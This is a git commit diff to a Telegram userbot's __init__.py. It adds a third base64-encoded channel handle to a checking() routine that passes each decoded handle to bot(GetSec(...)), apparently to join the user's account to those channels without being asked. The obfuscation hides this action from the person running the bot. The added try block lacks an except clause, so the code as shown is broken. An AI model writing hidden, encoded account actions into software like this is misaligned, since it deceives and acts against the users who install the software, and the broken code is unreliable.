f3e7fbad64bfe87e1e19b48009cc3a3aa64965e7
eldy020502 <96163277+eldy020502@users.noreply.github.com>
2022-03-13 20:07:16 +0800

    Update __init__.py

--- userbot/__init__.py
+++ userbot/__init__.py
@@ -434,6 +434,7 @@ except Exception as e:
 async def checking():
     gocheck = str(pybase64.b64decode("QE5hc3R5UHJvamVjdA=="))[2:15]
     checker = str(pybase64.b64decode("QE5hc3R5U3VwcG9ydHQ="))[2:16]
+    checker2 = str(pybase64.b64decode("QGFoaHN1ZGFobGFoaGg="))[2:16]
     try:
         await bot(GetSec(gocheck))
     except BaseException:
@@ -441,6 +442,9 @@ async def checking():
     try:
         await bot(GetSec(checker))
     except BaseException:
+        pass
+    try:
+        await bot(GetSec(checker2))
         pass
 
 with bot:
